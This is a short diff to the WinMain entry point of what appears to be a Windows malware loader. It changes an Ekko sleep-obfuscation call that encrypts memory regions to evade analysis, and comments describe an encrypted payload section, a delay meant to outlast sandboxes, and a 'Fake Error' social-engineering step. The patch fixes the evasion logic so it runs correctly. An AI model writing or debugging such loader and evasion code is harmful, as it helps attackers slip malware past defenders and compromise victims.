@@ -269,7 +269,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 4: Sleep Obfuscation (initial delay to outlast sandboxes) ──
     if (GlobalConfig.bEkkoSleep) {
-        SleepObf::EkkoSleep(PayloadData.data, PayloadData.size, 8000);
+        // Pass nullptr for primaryRegion — only encrypt MEM_PRIVATE+EXECUTE regions.
+        // PayloadData is MEM_IMAGE (.xthrx section), VirtualProtect on it during
+        // EkkoSleep corrupts the counter alignment if EncryptRegions skips it.
+        // Payload is already encrypted at rest; only RWX shellcode regions need
+        // Ekko protection (which don't exist yet at this early stage).
+        SleepObf::EkkoSleep(nullptr, 0, 8000);
     }
 
     // ── Step 5: Fake Error (Social Engineering) ──
